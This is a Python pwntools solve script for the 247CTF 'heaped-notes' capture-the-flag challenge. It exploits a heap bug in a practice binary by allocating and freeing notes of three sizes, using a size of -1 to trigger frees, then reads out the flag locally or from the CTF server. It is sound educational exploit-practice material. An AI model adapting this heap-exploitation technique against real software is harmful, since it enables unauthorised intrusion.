#!/usr/bin/env python3

'''
WhatTheFuzz's submission for the 247CTF challenge heaped-notes.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

from enum import Enum
from pwn import *


exe = ELF('./heaped_notes')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

NOTE_VALUE = b'test'

class Commands(Enum):
    PRINT = 'print'
    SMALL = 'small'
    MEDIUM = 'medium'
    LARGE = 'large'
    flag = 'flag'

def create_note(io, note):
    '''Create a note.
    '''
    io.sendlineafter(b'Enter command:', note.value.encode())
    # The size doesn't really matter, it just matters that they all share the
    # same number. Note that the small note can only be up to 32 bytes in
    # length, so that's the limit.
    io.sendlineafter(f'Enter the size of your {note.value} note:'.encode(), b'8')
    io.sendlineafter(f'Enter {note.value} note data:'.encode(), NOTE_VALUE)

def free_note(io, note):
    '''Free a note.
    '''
    io.sendlineafter(b'Enter command:', note.value.encode())
    # A value of -1 will trigger the free(0) codepath.
    io.sendlineafter(f'Enter the size of your {note.value} note:'.encode(), b'-1')

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    # This address won't work for you, as it's unique per person per session.
    if args.get('REMOTE'):
        io = remote('4fe6cb9e364e724b.247ctf.com', 50006)

    else:
        io = process([exe.path])

    return io


def main():
    '''Return the flag.
    '''

    with conn() as io:

        # Create and then free a small note.
        create_note(io, Commands.SMALL)
        free_note(io, Commands.SMALL)

        # Create and then free a medium note.
        create_note(io, Commands.MEDIUM)
        free_note (io, Commands.MEDIUM)

        # Create and then free a large note.
        create_note(io, Commands.LARGE)
        free_note(io, Commands.LARGE)

        # Print the flag.
        io.sendlineafter(b'Enter command:', Commands.flag.value.encode())
        flag = io.recvregex(rb'247CTF{.*?}')
        log.success(f'The flag is: {flag.decode()}')


if __name__ == '__main__':
    main()
